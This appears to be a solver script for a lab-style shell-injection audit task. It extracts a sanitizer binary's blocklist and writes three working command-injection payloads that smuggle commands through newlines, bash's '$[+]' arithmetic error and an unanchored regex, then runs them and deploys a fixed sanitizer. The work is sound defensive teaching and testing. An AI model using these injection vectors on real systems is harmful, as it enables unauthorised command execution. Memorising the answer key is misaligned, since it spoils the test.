#!/usr/bin/env python3
"""
Solver for the shell metacharacter filter bypass audit task.

Phase 1: Binary reverse engineering of /app/bin/sanitize_direct
Phase 2: Exploit development for all three contexts
Phase 3: Hardened sanitizer deployment
"""

import json
import os
import subprocess
import shutil
import importlib.util
import time

# ===================================================================
# Phase 1: Binary analysis using strings and objdump
# ===================================================================

# Extract printable strings from the stripped ELF binary
result = subprocess.run(
    ["strings", "/app/bin/sanitize_direct"],
    capture_output=True, text=True
)
binary_strings = [l.strip() for l in result.stdout.strip().split("\n") if l.strip()]

print("=== strings output ===")
for s in binary_strings:
    print(f"  {repr(s)}")

# Cross-reference with objdump .rodata section dump
result_rodata = subprocess.run(
    ["objdump", "-s", "-j", ".rodata", "/app/bin/sanitize_direct"],
    capture_output=True, text=True
)
print("\n=== .rodata section ===")
print(result_rodata.stdout)

# Extract the build identifier: alpha prefix + dash + hex-like suffix
build_id = None
for s in binary_strings:
    if len(s) > 8 and len(s) < 30 and s[:4].isalpha() and '-' in s[4:6]:
        parts = s.split('-', 1)
        if len(parts) == 2 and len(parts[1]) >= 8 and all(c.isalnum() for c in parts[1]):
            build_id = s
            break

# Extract the blocklist: string of only non-alphanumeric, non-space chars
blocklist = None
for s in binary_strings:
    if len(s) >= 10 and all(not c.isalnum() and not c.isspace() for c in s):
        blocklist = s
        break

print(f"\nBuild ID: {build_id}")
print(f"Blocklist: {repr(blocklist)}")
print(f"Blocklist chars: {list(blocklist)}")
print(f"Newline in blocklist: {'\\n' in blocklist}")
print(f"  -> Newline (0x0a) is NOT blocked by the binary filter")

# Write analysis files
os.makedirs("/app/analysis", exist_ok=True)
with open("/app/analysis/build_id.txt", "w") as f:
    f.write(build_id)
with open("/app/analysis/blocklist.txt", "w") as f:
    f.write(blocklist)

# ===================================================================
# Phase 2: Exploit development
# ===================================================================

os.makedirs("/app/exploits", exist_ok=True)

# --- Exploit 1: exec_proxy ---
# Sanitizer: Python BLOCKLIST_EXEC = "'`\";&<>|(){}"
# Missing from blocklist: $, [, ], newline (\n)
# Execution mode: exec (bash -c "exec <template>")
#
# Vector: $[+] is bash's deprecated arithmetic expansion syntax.
# $[+] causes an arithmetic syntax error. When used on the exec line,
# the exec builtin fails during argument expansion. Crucially, bash
# does NOT exit — it continues to the next simple command.
# By injecting $[+]\n<cmd>, the next line executes after exec fails.
# This mirrors the technique from CVE-2025-61984.
exploit_exec = {
    "username": "$[+]\ntouch /tmp/pwned_exec_proxy\n#",
    "hostname": "target.example.com",
    "port": "22",
}
with open("/app/exploits/exec_proxy.json", "w") as f:
    json.dump(exploit_exec, f, indent=2)

# --- Exploit 2: direct_tunnel ---
# Sanitizer: compiled binary with blocklist "'`\";&<>|(){}$[]"
# (discovered via binary analysis in Phase 1)
# Missing from blocklist: newline (\n) — char 0x0a
# Execution mode: direct (bash -c "<template>")
#
# Vector: inject \n<cmd> in hostname. The binary doesn't filter
# newlines, so they pass through. bash -c receives a multi-line
# string and executes each line as a separate simple command.
# The first line fails (command not found), but the second line
# with our injected command executes successfully.
exploit_direct = {
    "username": "x",
    "hostname": "x\ntouch /tmp/pwned_direct_tunnel\n#",
    "port": "22",
}
with open("/app/exploits/direct_tunnel.json", "w") as f:
    json.dump(exploit_direct, f, indent=2)

# --- Exploit 3: checked_health ---
# Sanitizer: Python re.match(r'[a-zA-Z0-9._@:/-]+', value)
# Bug: re.match() only anchors at the START of the string.
# It does NOT verify the ENTIRE string matches (no $ anchor,
# and match() is not fullmatch()). A value starting with
# valid characters passes even if followed by \n + shell commands.
# Execution mode: direct
#
# Vector: "valid\ntouch /tmp/pwned_checked_health\n#"
# re.match matches "valid" at position 0 and returns a match object.
# The newline and everything after is never examined.
exploit_checked = {
    "username": "valid\ntouch /tmp/pwned_checked_health\n#",
    "hostname": "target.example.com",
    "port": "22",
}
with open("/app/exploits/checked_health.json", "w") as f:
    json.dump(exploit_checked, f, indent=2)

# ===================================================================
# Verify exploits work
# ===================================================================

spec = importlib.util.spec_from_file_location("engine", "/app/engine.py")
engine = importlib.util.module_from_spec(spec)
spec.loader.exec_module(engine)

all_ok = True
for ctx_name in ["exec_proxy", "direct_tunnel", "checked_health"]:
    marker = f"/tmp/pwned_{ctx_name}"
    if os.path.exists(marker):
        os.remove(marker)

    with open(f"/app/exploits/{ctx_name}.json") as f:
        exploit = json.load(f)

    ctx = engine.CONTEXTS[ctx_name]
    sanitizer = ctx["sanitizer"]

    safe_user = sanitizer(exploit["username"])
    safe_host = sanitizer(exploit["hostname"])
    safe_port = sanitizer(str(exploit["port"]))

    cmd = ctx["template"]
    cmd = cmd.replace("%u", safe_user)
    cmd = cmd.replace("%h", safe_host)
    cmd = cmd.replace("%p", safe_port)

    if ctx["execution"] == "exec":
        full_cmd = f"exec {cmd}"
    else:
        full_cmd = cmd

    try:
        subprocess.run(
            ["bash", "-c", full_cmd],
            capture_output=True, text=True, timeout=5
        )
    except subprocess.TimeoutExpired:
        pass

    if os.path.exists(marker):
        print(f"  {ctx_name}: exploit verified (marker created)")
    else:
        print(f"  {ctx_name}: FAILED (no marker file)")
        all_ok = False

# ===================================================================
# Phase 3: Deploy hardened sanitizer
# ===================================================================

shutil.copy("/solution/sanitizer_fixed.py", "/app/sanitizer_fixed.py")
print("\nHardened sanitizer deployed to /app/sanitizer_fixed.py")

# ===================================================================
# Phase 4: Demonstrate service interaction via curl
# ===================================================================

# Start the HTTP service
server_proc = subprocess.Popen(
    ["python3", "/app/server.py", "9443"],
    stdout=subprocess.PIPE, stderr=subprocess.PIPE
)
time.sleep(1)

try:
    # Discover service endpoints
    r = subprocess.run(
        ["curl", "-s", "http://localhost:9443/status"],
        capture_output=True, text=True, timeout=5
    )
    print(f"\nService status:\n{r.stdout}")

    # Deliver an exploit via curl
    r = subprocess.run(
        ["curl", "-s", "-X", "POST", "http://localhost:9443/exec_proxy",
         "-H", "Content-Type: application/json",
         "-d", json.dumps(exploit_exec)],
        capture_output=True, text=True, timeout=5
    )
    print(f"Exploit delivery response: {r.stdout}")
finally:
    server_proc.terminate()
    server_proc.wait()

if all_ok:
    print("\nAll exploits verified. Solution complete.")
else:
    print("\nWARNING: Some exploits failed verification.")
